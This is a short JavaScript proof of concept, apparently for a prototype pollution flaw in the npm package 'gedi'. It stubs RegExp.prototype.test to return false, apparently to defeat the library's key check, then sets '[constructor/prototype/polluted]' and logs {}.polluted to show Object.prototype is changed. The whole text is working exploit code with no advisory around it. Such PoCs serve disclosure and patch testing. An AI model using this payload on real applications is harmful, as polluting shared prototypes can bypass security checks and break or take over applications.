RegExp.prototype.test = () => false;
console.log({}.polluted);
const gedi = require('gedi');
gedi().set('[constructor/prototype/polluted]', 'yes');
console.log({}.polluted);